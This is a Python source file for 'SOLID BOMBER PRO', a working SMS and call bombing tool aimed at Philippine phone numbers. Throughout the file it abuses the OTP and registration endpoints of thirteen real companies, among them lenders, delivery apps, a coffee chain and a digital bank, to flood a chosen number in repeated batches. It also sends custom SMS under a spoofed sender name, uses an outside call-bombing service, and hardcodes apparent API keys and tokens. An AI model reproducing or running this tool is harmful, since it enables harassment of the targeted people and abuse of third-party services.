import requests
import random
import string
import time
import json
from datetime import datetime
import os
import sys
import asyncio
import aiohttp
import logging
try:
    import readline
except ImportError:
    readline = None
from urllib.parse import urlencode
from typing import List, Dict, Tuple

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("SolidBomber")

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    GRAY = '\033[90m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

class UIComponents:
    def header(text):
        width = 60
        print(f"{Colors.CYAN}{Colors.BOLD}╔{'═' * (width - 2)}╗{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}║{text.center(width - 2)}║{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}╚{'═' * (width - 2)}╝{Colors.RESET}")

    def subheader(text):
        print(f"\n{Colors.BLUE}{Colors.BOLD}▸ {text}{Colors.RESET}")

    def service_status(service, status):
        status_text = f"{Colors.GREEN}SUCCESS{Colors.RESET}" if status else f"{Colors.RED}FAILED{Colors.RESET}"
        symbol = f"{Colors.GREEN}✓{Colors.RESET}" if status else f"{Colors.RED}✗{Colors.RESET}"
        print(f"  {symbol} {service:<20} {status_text}")

    def menu_item(number, text):
        print(f"  {Colors.YELLOW}[{number}] {text}{Colors.RESET}")

    def stats_box(success, failed, total, target=""):
        print(f"\n{Colors.CYAN}{Colors.BOLD}╔{'═' * 38}╗{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}║           ATTACK STATISTICS         ║{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}╠{'═' * 38}╣{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}║ {Colors.GREEN}✓ Successful: {success:<19} {Colors.CYAN}║{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}║ {Colors.RED}✗ Failed: {failed:<23} {Colors.CYAN}║{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}║ {Colors.WHITE}Total: {total:<26} {Colors.CYAN}║{Colors.RESET}")
        if target:
            print(f"{Colors.CYAN}{Colors.BOLD}║ {Colors.YELLOW}Target: {target:<24} {Colors.CYAN} ║{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}╚{'═' * 38}╝{Colors.RESET}")

    @staticmethod
    def batch_header(batch_num, total_batches):
        print(f"\n{Colors.MAGENTA}{Colors.BOLD}🔄 BATCH {batch_num}/{total_batches} {'─' * 30}{Colors.RESET}")

def show_banner():
    if os.environ.get('RENDER'):
        return
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = rf"""
{Colors.MAGENTA}{Colors.BOLD}
▓█████▄  ██▀███   ▒█████    ██████  ▒█████   ███▄ ▄███▓
▒██▀ ██▌▓██ ▒ ██▒▒██▒  ██▒▒██    ▒ ▒██▒  ██▒▓██▒▀█▀ ██▒
░██   █▌▓██ ░▄█ ▒▒██░  ██▒░ ▓██▄   ▒██░  ██▒▓██    ▓██░
░▓█▄   ▌▒██▀▀█▄  ▒██   ██░  ▒   ██▒▒██   ██░▒██    ▒██ 
░▒████▓ ░██▓ ▒██▒░ ████▓▒░▒██████▒▒░ ████▓▒░▒██▒   ░██▒
 ▒▒▓  ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ░  ░
 ░ ▒  ▒   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░  ░ ▒ ▒░ ░  ░      ░
 ░ ░  ░   ░░   ░ ░ ░ ░ ▒  ░  ░  ░  ░ ░ ░ ▒  ░      ░   
   ░       ░         ░ ░        ░      ░ ░         ░   
 ░                                                      
    {Colors.RESET}"""
    print(banner)
    print(f"{Colors.CYAN}{'═' * 65}{Colors.RESET}")
    print(f"{Colors.YELLOW}{Colors.BOLD}      MULTI SMS & CALL BOMBER {Colors.RESET}")
    print(f"{Colors.GREEN}           SOLID BOMBER PRO{Colors.RESET}")
    print(f"{Colors.CYAN}{'═' * 65}{Colors.RESET}\n")

def ask(question, color=Colors.CYAN):
    return input(f"{color}{Colors.BOLD}{question} ➜ {Colors.RESET}")

def random_string(length):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def random_gmail():
    return f"{random_string(8)}@gmail.com"

def random_uid():
    return random_string(28)

def random_device_id():
    return random_string(16)

def normalize_phone_number(phone):
    phone = phone.replace(' ', '')
    
    if phone.startswith('0'):
        return '+63' + phone[1:]
    elif phone.startswith('63') and not phone.startswith('+63'):
        return '+' + phone
    elif not phone.startswith('+63') and len(phone) == 10:
        return '+63' + phone
    elif not phone.startswith('+'):
        return '+63' + phone
    
    return phone

FINGERPRINT_VISITOR_ID = "TPt0yCuOFim3N3rzvrL1"
FINGERPRINT_REQUEST_ID = "1757149666261.Rr1VvG"

class SMSBomber:
    def __init__(self, session=None):
        self.success_count = 0
        self.fail_count = 0
        self._session = session
        self.custom_sender_name = "User"
        self.custom_message = "Test Message"

    async def _get_session(self):
        if self._session is None or self._session.closed:
            self._session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=15),
                connector=aiohttp.TCPConnector(limit=100)
            )
        return self._session

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()

    async def __aenter__(self):
        await self._get_session()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.close()

    def set_custom_data(self, sender_name="User", message="Test Message"):
        self.custom_sender_name = sender_name
        self.custom_message = message

    async def execute_attack(self, number_to_send, amount, selected_services=None, callback=None):
        if selected_services is None or "all" in selected_services:
            selected_services = self.get_all_services()
        
        if not os.environ.get('RENDER'):
            UIComponents.header("SMS & CALL BOMBER ATTACK INITIATED")
            print(f"{Colors.CYAN}   Target: {number_to_send}{Colors.RESET}")
            print(f"{Colors.CYAN}   Batches: {amount}{Colors.RESET}")
            print(f"{Colors.CYAN}   Services: {len(selected_services)} selected{Colors.RESET}")
        
        # Ensure session is initialized
        await self._get_session()
        
        for i in range(1, amount + 1):
            if not os.environ.get('RENDER'):
                UIComponents.batch_header(i, amount)
            
            tasks = []
            service_display_names = []

            for service_name in selected_services:
                if service_name == "CUSTOM_SMS":
                    tasks.append(self.send_custom_sms(number_to_send))
                    service_display_names.append("CUSTOM SMS")
                elif service_name == "EZLOAN":
                    tasks.append(self.send_ezloan(number_to_send))
                    service_display_names.append("EZLOAN")
                elif service_name == "XPRESS":
                    tasks.append(self.send_xpress(number_to_send, i))
                    service_display_names.append("XPRESS PH")
                elif service_name == "ABENSON":
                    tasks.append(self.send_abenson(number_to_send))
                    service_display_names.append("ABENSON")
                elif service_name == "EXCELLENT_LENDING":
                    tasks.append(self.send_excellent_lending(number_to_send))
                    service_display_names.append("EXCELLENT LENDING")
                elif service_name == "FORTUNE_PAY":
                    tasks.append(self.send_fortune_pay(number_to_send))
                    service_display_names.append("FORTUNE PAY")
                elif service_name == "WEMOVE":
                    tasks.append(self.send_wemove(number_to_send))
                    service_display_names.append("WEMOVE")
                elif service_name == "LBC":
                    tasks.append(self.send_lbc(number_to_send))
                    service_display_names.append("LBC CONNECT")
                elif service_name == "PICKUP_COFFEE":
                    tasks.append(self.send_pickup_coffee(number_to_send))
                    service_display_names.append("PICKUP COFFEE")
                elif service_name == "HONEY_LOAN":
                    tasks.append(self.send_honey_loan(number_to_send))
                    service_display_names.append("HONEY LOAN")
                elif service_name == "KOMO_PH":
                    tasks.append(self.send_komo_ph(number_to_send))
                    service_display_names.append("KOMO PH")
                elif service_name == "S5_OTP":
                    tasks.append(self.send_s5_otp(number_to_send))
                    service_display_names.append("S5.COM")
                elif service_name == "CALL_BOMB":
                    tasks.append(self.send_call_bomb(number_to_send))
                    service_display_names.append("CALL BOMB")

            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            batch_success = 0
            batch_fail = 0
            
            for display_name, result in zip(service_display_names, results):
                is_success = result is True
                if is_success:
                    self.success_count += 1
                    batch_success += 1
                else:
                    self.fail_count += 1
                    batch_fail += 1
                
                if not os.environ.get('RENDER'):
                    UIComponents.service_status(display_name, is_success)

            if not os.environ.get('RENDER'):
                print(f"\n{Colors.CYAN}   Batch {i} completed: {Colors.GREEN}{batch_success} success{Colors.RESET} | {Colors.RED}{batch_fail} failed{Colors.RESET}")
            
            if callback:
                await callback(i, amount, batch_success, batch_fail)

            if i < amount:
                delay = random.randint(2, 4)
                if not os.environ.get('RENDER'):
                    print(f"{Colors.YELLOW}   Waiting {delay} seconds before next batch...{Colors.RESET}")
                await asyncio.sleep(delay)

    async def send_custom_sms(self, number_to_send):
        """Send custom SMS using the m2techtronix service"""
        try:
            normalized_number = normalize_phone_number(number_to_send)
            
            if not normalized_number:
                return False

            suffix = '-freed0m'
            credits = '\n\nCreated by: ANTRAX'
            if self.custom_message.endswith(suffix):
                with_suffix = self.custom_message
            else:
                with_suffix = f"{self.custom_message} {suffix}"
            final_text = f"{with_suffix}{credits}"

            command_array = [
                'free.text.sms',
                '421',
                normalized_number,
                '2207117BPG',
                'fuT8-dobSdyEFRuwiHrxiz:APA91bHNbeMP4HxJR-eBEAS0lf9fyBPg-HWWd21A9davPtqxmU-J-TTQWf28KXsWnnTnEAoriWq3TFG8Xdcp83C6GrwGka4sTd_6qnlqbfN4gP82YaTgvvg',
                final_text
            ]

            headers = {
                'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 15; 2207117BPG Build/AP3A.240905.015.A2)',
                'Connection': 'Keep-Alive',
                'Content-Type': 'application/x-www-form-urlencoded'
            }

            data = {
                'UID': random_uid(),
                'humottaee': 'Processing',
                'Email': random_gmail(),
                '$Oj0O%K7zi2j18E': json.dumps(command_array),
                'device_id': random_device_id(),
                'Photo': 'https://lh3.googleusercontent.com/a/ACg8ocJyIdNL-vWOcm_v4Enq2PRZRcNaU_c8Xt0DJ1LNvmtKDiVQ-A=s96-c',
                'Name': self.custom_sender_name
            }

            session = await self._get_session()
            async with session.post(
                'https://sms.m2techtronix.com/v13/sms.php',
                data=urlencode(data),
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as response:
                return response.status < 400
        except Exception as e:
            logger.error(f"CUSTOM_SMS failed for {number_to_send}: {str(e)}")
            return False

    async def send_ezloan(self, number_to_send):
        try:
            headers = {
                'User-Agent': 'okhttp/4.9.2',
                'Accept': 'application/json',
                'Content-Type': 'application/json',
            }
            
            data = {
                "businessId": "EZLOAN",
                "contactNumber": number_to_send,
                "appsflyerIdentifier": "1760444943092-3966994042140191452"
            }
            
            session = await self._get_session()
            async with session.post(
                'https://gateway.ezloancash.ph/security/auth/otp/request',
                headers=headers,
                json=data,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as response:
                return response.status < 400
        except Exception as e:
            logger.error(f"EZLOAN failed for {number_to_send}: {str(e)}")
            return False

    async def send_xpress(self, number_to_send, i):
        try:
            formatted_num = self.format_number(number_to_send)
            data = {
                "FirstName": "user",
                "LastName": "test",
                "Email": f"user{int(time.time() * 1000)}_{i}@gmail.com",
                "Phone": formatted_num,
                "Password": "Pass1234",
                "ConfirmPassword": "Pass1234",
                "FingerprintVisitorId": FINGERPRINT_VISITOR_ID,
                "FingerprintRequestId": FINGERPRINT_REQUEST_ID,
            }
            
            headers = {
                "User-Agent": "Dalvik/2.1.0",
                "Content-Type": "application/json",
            }
            
            session = await self._get_session()
            async with session.post(
                "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                headers=headers,
                json=data,
                timeout=aiohttp.ClientTimeout(total=8)
            ) as response:
                return response.status < 400
        except Exception as e:
            logger.error(f"XPRESS failed for {number_to_send}: {str(e)}")
            return False

    async def send_abenson(self, number_to_send):
        try:
            data = {
                "contact_no": number_to_send,
                "login_token": "undefined"
            }
            
            headers = {
                'User-Agent': 'okhttp/4.9.0',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            session = await self._get_session()
            async with session.post(
                'https://api.mobile.abenson.com/api/public/membership/activate_otp',
                headers=headers,
                data=data,
                timeout=aiohttp.ClientTimeout(total=8)
            ) as response:
                return response.status < 400
        except Exception as e:
            logger.error(f"ABENSON failed for {number_to_send}: {str(e)}")
            return False

    async def send_excellent_lending(self, number_to_send):
        try:
            coordinates = [
                {"lat": "14.5995", "long": "120.9842"},
                {"lat": "14.6760", "long": "121.0437"},
                {"lat": "14.8648", "long": "121.0418"}
            ]
            user_agents = [
                'okhttp/4.12.0',
                'okhttp/4.9.2',
                'Dart/3.6 (dart:io)',
            ]
            
            coord = random.choice(coordinates)
            agent = random.choice(user_agents)
            
            data = {
                "domain": number_to_send,
                "cat": "login",
                "previous": False,
                "financial": "efe35521e51f924efcad5d61d61072a9"
            }
            
            headers = {
                'User-Agent': agent,
                'Content-Type': 'application/json; charset=utf-8',
                'x-latitude': coord["lat"],
                'x-longitude': coord["long"]
            }
            
            session = await self._get_session()
            async with session.post(
                'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
                headers=headers,
                json=data,
                timeout=aiohttp.ClientTimeout(total=8)
            ) as response:
                return response.status < 400
        except Exception as e:
            logger.error(f"EXCELLENT_LENDING failed for {number_to_send}: {str(e)}")
            return False

    async def send_fortune_pay(self, number_to_send):
        try:
            data = {
                "deviceId": "c31a9bc0-652d-11f0-88cf-9d4076456969",
                "deviceType": "GOOGLE_PLAY",
                "companyId": "4bf735e97269421a80b82359e7dc2288",
                "dialCode": "+63",
                "phoneNumber": number_to_send.replace('0', '', 1) if number_to_send.startswith('0') else number_to_send
            }
            
            headers = {
                'User-Agent': 'Dart/3.6 (dart:io)',
                'Content-Type': 'application/json',
                'app-type': 'GOOGLE_PLAY',
                'authorization': 'Bearer',
            }
            
            session = await self._get_session()
            async with session.post(
                'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register',
                headers=headers,
                json=data,
                timeout=aiohttp.ClientTimeout(total=8)
            ) as response:
                return response.status < 400
        except Exception as e:
            logger.error(f"FORTUNE_PAY failed for {number_to_send}: {str(e)}")
            return False

    async def send_wemove(self, number_to_send):
        try:
            data = {
                "phone_country": "+63",
                "phone_no": number_to_send.replace('0', '', 1) if number_to_send.startswith('0') else number_to_send
            }
            
            headers = {
                'User-Agent': 'okhttp/4.9.3',
                'Content-Type': 'application/json',
                'xuid_type': 'user',
                'source': 'customer',
                'authorization': 'Bearer'
            }
            
            session = await self._get_session()
            async with session.post(
                'https://api.wemove.com.ph/auth/users',
                headers=headers,
                json=data,
                timeout=aiohttp.ClientTimeout(total=8)
            ) as response:
                return response.status < 400
        except Exception as e:
            logger.error(f"WEMOVE failed for {number_to_send}: {str(e)}")
            return False

    async def send_lbc(self, number_to_send):
        try:
            data = {
                "verification_type": "mobile",
                "client_email": f"{random_string(8)}@gmail.com",
                "client_contact_code": "+63",
                "client_contact_no": number_to_send.replace('0', '', 1) if number_to_send.startswith('0') else number_to_send,
                "app_log_uid": random_string(16),
            }
            
            headers = {
                'User-Agent': 'Dart/2.19 (dart:io)',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            session = await self._get_session()
            async with session.post(
                'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification',
                headers=headers,
                data=data,
                timeout=aiohttp.ClientTimeout(total=8)
            ) as response:
                return response.status < 400
        except Exception as e:
            logger.error(f"LBC failed for {number_to_send}: {str(e)}")
            return False

    async def send_pickup_coffee(self, number_to_send):
        try:
            user_agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']
            formatted_num = self.format_number(number_to_send)
            
            data = {
                "mobile_number": formatted_num,
                "login_method": "mobile_number"
            }
            
            headers = {
                'User-Agent': random.choice(user_agents),
                'Content-Type': 'application/json',
            }
            
            session = await self._get_session()
            async with session.post(
                'https://production.api.pickup-coffee.net/v2/customers/login',
                headers=headers,
                json=data,
                timeout=aiohttp.ClientTimeout(total=8)
            ) as response:
                return response.status < 400
        except Exception as e:
            logger.error(f"PICKUP_COFFEE failed for {number_to_send}: {str(e)}")
            return False

    async def send_honey_loan(self, number_to_send):
        try:
            data = {
                "phone": number_to_send,
                "is_rights_block_accepted": 1
            }
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
                'Content-Type': 'application/json',
            }
            
            session = await self._get_session()
            async with session.post(
                'https://api.honeyloan.ph/api/client/registration/step-one',
                headers=headers,
                json=data,
                timeout=aiohttp.ClientTimeout(total=8)
            ) as response:
                return response.status < 400
        except Exception as e:
            logger.error(f"HONEY_LOAN failed for {number_to_send}: {str(e)}")
            return False

    async def send_komo_ph(self, number_to_send):
        try:
            headers = {
                'Content-Type': 'application/json',
                'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
                'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
            }
            
            data = {
                "mobile": number_to_send,
                "transactionType": 6
            }
            
            session = await self._get_session()
            async with session.post(
                'https://api.komo.ph/api/otp/v5/generate',
                headers=headers,
                json=data,
                timeout=aiohttp.ClientTimeout(total=8)
            ) as response:
                return response.status < 400
        except Exception as e:
            logger.error(f"KOMO_PH failed for {number_to_send}: {str(e)}")
            return False

    async def send_s5_otp(self, phone_number):
        try:
            normalized_phone = normalize_phone_number(phone_number)
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en',
                'content-type': 'multipart/form-data;',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            }

            body = f"phone_number={normalized_phone}"

            session = await self._get_session()
            async with session.post(
                'https://api.s5.com/player/api/v1/otp/request',
                headers=headers,
                data=body,
                timeout=aiohttp.ClientTimeout(total=8)
            ) as response:
                return response.status < 400
        except Exception as e:
            logger.error(f"S5_OTP failed for {phone_number}: {str(e)}")
            return False

    async def send_call_bomb(self, phone_number):
        """Call bombing service integration"""
        try:
            normalized_phone = normalize_phone_number(phone_number).replace('+', '')
            
            if not normalized_phone.startswith('63'):
                return False

            headers = {'Content-Type': 'application/json'}
            data = json.dumps({"phone": f"+{normalized_phone}"})
            
            session = await self._get_session()
            async with session.post(
                "https://call-bomb.onrender.com/",
                data=data,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as response:
                if response.status == 200:
                    result = await response.json()
                    if result.get('success'):
                        return True
                return False
        except Exception as e:
            logger.error(f"CALL_BOMB failed for {phone_number}: {str(e)}")
            return False

    def format_number(self, number):
        if number.startswith('+63'):
            return number
        elif number.startswith('09'):
            return '+63' + number[2:]
        elif number.startswith('9'):
            return '+63' + number
        else:
            return number

    def get_all_services(self):
        return [
            "CUSTOM_SMS", "EZLOAN", "XPRESS", "ABENSON", "EXCELLENT_LENDING",
            "FORTUNE_PAY", "WEMOVE", "LBC", "PICKUP_COFFEE", "HONEY_LOAN",
            "KOMO_PH", "S5_OTP", "CALL_BOMB"
        ]

    def get_stats(self):
        return {
            "success": self.success_count,
            "failed": self.fail_count,
            "total": self.success_count + self.fail_count
        }

    def reset_stats(self):
        self.success_count = 0
        self.fail_count = 0

async def main_menu():
    show_banner()
    
    UIComponents.header("MAIN MENU")
    UIComponents.menu_item("1", "Multi-Service SMS & Call Bomber")
    UIComponents.menu_item("2", "Service Selection")
    UIComponents.menu_item("3", "About & Instructions")
    UIComponents.menu_item("0", "Exit")
    print()
    
    choice = ask('Select option')
    
    if choice == '1':
        await start_multi_bomber()
    elif choice == '2':
        await service_selection_menu()
    elif choice == '3':
        await about_menu()
    elif choice == '0':
        print(f"{Colors.GREEN}Thank you for using SOLID BOMBER PRO!{Colors.RESET}")
        sys.exit(0)
    else:
        print(f"{Colors.RED}Invalid selection!{Colors.RESET}")
        await asyncio.sleep(1)
        await main_menu()

async def service_selection_menu():
    show_banner()
    UIComponents.header("SERVICE SELECTION")
    
    services = [
        "CUSTOM_SMS", "EZLOAN", "XPRESS", "ABENSON", "EXCELLENT_LENDING",
        "FORTUNE_PAY", "WEMOVE", "LBC", "PICKUP_COFFEE", "HONEY_LOAN",
        "KOMO_PH", "S5_OTP", "CALL_BOMB"
    ]
    
    service_descriptions = {
        "CUSTOM_SMS": "Personalized SMS messaging",
        "EZLOAN": "Loan service OTP",
        "XPRESS": "Xpress PH delivery service", 
        "ABENSON": "Appliance store OTP",
        "EXCELLENT_LENDING": "Loan provider",
        "FORTUNE_PAY": "Payment service",
        "WEMOVE": "Moving service",
        "LBC": "LBC Connect delivery",
        "PICKUP_COFFEE": "Coffee shop app",
        "HONEY_LOAN": "Loan service",
        "KOMO_PH": "Digital banking",
        "S5_OTP": "Gaming platform",
        "CALL_BOMB": "Call bombing service"
    }
    
    print(f"{Colors.WHITE}Select services to use (comma-separated):{Colors.RESET}")
    print()
    
    for i, service in enumerate(services, 1):
        description = service_descriptions.get(service, "")
        print(f"  {Colors.CYAN}[{i:2d}] {service:<20} {Colors.GRAY}{description}{Colors.RESET}")
    
    print(f"\n  {Colors.CYAN}[all] All services{Colors.RESET}")
    print(f"  {Colors.CYAN}[0]  Back to main menu{Colors.RESET}")
    print()
    
    selection = ask('Service selection')
    
    if selection.lower() == '0':
        await main_menu()
        return None
    elif selection.lower() == 'all':
        return services
    else:
        selected_services = []
        try:
            indices = [int(x.strip()) for x in selection.split(',')]
            for idx in indices:
                if 1 <= idx <= len(services):
                    selected_services.append(services[idx-1])
        except ValueError:
            print(f"{Colors.RED}Invalid selection format!{Colors.RESET}")
            await asyncio.sleep(2)
            return await service_selection_menu()
        
        if not selected_services:
            print(f"{Colors.RED}No services selected!{Colors.RESET}")
            await asyncio.sleep(2)
            return await service_selection_menu()
        
        print(f"{Colors.GREEN}Selected {len(selected_services)} services{Colors.RESET}")
        return selected_services

async def start_multi_bomber():
    show_banner()
    UIComponents.header("MULTI-SERVICE SMS & CALL BOMBER")
    
    selected_services = await service_selection_menu()
    if selected_services is None:
        return
    
    UIComponents.subheader("Target Information")
    print(f"{Colors.CYAN}   PHONE FORMAT: 09123456789 / 9123456789 / +639123456789{Colors.RESET}")
    print()
    
    number_input = ask('Target Number')
    amount_input = ask('Amount (MAX 100)')

    import re
    if not re.match(r'^(09\d{9}|9\d{9}|\+639\d{9})$', number_input.replace(' ', '')):
        print(f"{Colors.RED}Invalid phone number format!{Colors.RESET}")
        ask('\nPress Enter to continue...')
        return await main_menu()

    try:
        amount = int(amount_input) if amount_input else 10
    except ValueError:
        amount = 10
    
    if amount > 100:
        print(f"{Colors.YELLOW}Amount set to maximum 100{Colors.RESET}")
        amount = 100
    
    if amount < 1:
        print(f"{Colors.RED}Amount must be at least 1{Colors.RESET}")
        ask('\nPress Enter to continue...')
        return await main_menu()

    custom_sender = "User"
    custom_message = "Test Message"
    
    if "CUSTOM_SMS" in selected_services:
        UIComponents.subheader("Custom SMS Configuration")
        custom_sender = ask('Sender Name') or "User"
        custom_message = ask('Message') or "Test Message"

    async with SMSBomber() as bomber:
        bomber.set_custom_data(custom_sender, custom_message)

        UIComponents.subheader("Starting Attack")
        await bomber.execute_attack(number_input, amount, selected_services)

        stats = bomber.get_stats()
        UIComponents.stats_box(stats['success'], stats['failed'], stats['total'], number_input)

        print()
        again = ask('Launch another attack? (y/n)', Colors.YELLOW)
        if again.lower() == 'y':
            # Note: bomber will be closed after this block, so we need to start over
            await start_multi_bomber()
        else:
            print(f"{Colors.CYAN}Returning to main menu...{Colors.RESET}")
            await asyncio.sleep(1)
            await main_menu()

async def about_menu():
    show_banner()
    UIComponents.header("ABOUT & INSTRUCTIONS")
    
    print(f"{Colors.CYAN}{Colors.BOLD} SOLID BOMBER PRO{Colors.RESET}")
    print(f"{Colors.GREEN}Advanced SMS & Call Bombing Tool{Colors.RESET}")
    print()
    
    UIComponents.subheader("Features:")
    print(f"{Colors.WHITE}• 12 Different SMS Services + Call Bombing")
    print(f"• Custom SMS with Personalization")
    print(f"• Service Selection Options")
    print(f"• Real-time Progress Tracking")
    print(f"• Advanced UI with Colors")
    print(f"• Async Concurrent Processing{Colors.RESET}")
    print()
    
    UIComponents.subheader("Available Services:")
    services = [
        "CUSTOM_SMS - Personalized messaging",
        "EZLOAN - Loan service OTP",
        "XPRESS PH - Delivery service", 
        "ABENSON - Appliance store OTP",
        "EXCELLENT LENDING - Loan provider",
        "FORTUNE PAY - Payment service",
        "WEMOVE - Moving service",
        "LBC CONNECT - Delivery service",
        "PICKUP COFFEE - Coffee shop app",
        "HONEY LOAN - Loan service",
        "KOMO PH - Digital banking",
        "S5.COM - Gaming platform",
        "CALL BOMB - Call bombing service"
    ]
    
    for service in services:
        print(f"  {Colors.CYAN}• {service}{Colors.RESET}")
    
    print()
    UIComponents.subheader("Important Notes:")
    print(f"{Colors.YELLOW}• Use valid Philippine number formats")
    print(f"• Don't exceed reasonable limits")
    print(f"• Use responsibly and ethically")
    print(f"• Some services may have rate limits")
    print(f"• Call bombing service may have delays{Colors.RESET}")
    
    ask(f"\n{Colors.CYAN}Press Enter to return to main menu...{Colors.RESET}")
    await main_menu()

async def main():
    if os.environ.get('RENDER'):
        # In Render, we don't want to run the CLI main menu
        return
    try:
        try:
            import aiohttp
            import requests
        except ImportError:
            print(f"{Colors.YELLOW}Installing required packages...{Colors.RESET}")
            import subprocess
            subprocess.check_call([sys.executable, "-m", "pip", "install", "aiohttp", "requests"])
            import aiohttp
            import requests
        
        await main_menu()
    except KeyboardInterrupt:
        print(f"{Colors.YELLOW}\nProcess terminated by user{Colors.RESET}")
        sys.exit(0)
    except Exception as error:
        print(f"{Colors.RED}\nUnexpected error: {error}{Colors.RESET}")
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())